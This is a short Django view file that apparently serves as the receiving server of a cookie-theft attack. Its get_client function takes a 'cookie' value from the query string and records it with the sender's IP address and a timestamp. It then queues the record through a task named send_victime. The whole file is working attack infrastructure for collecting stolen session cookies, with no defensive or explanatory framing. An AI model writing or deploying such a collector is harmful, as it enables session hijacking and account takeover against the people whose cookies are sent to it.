from datetime import datetime
from django.http import HttpResponse
from tasks import send_victime
from client.models import Client


def get_client(request):
    client = Client()
    client.ip = request.META.get('REMOTE_ADDR')
    client.cookie = request.GET.get('cookie','None')
    client.date = datetime.now()
    send_victime.delay(client)
    return HttpResponse('ok')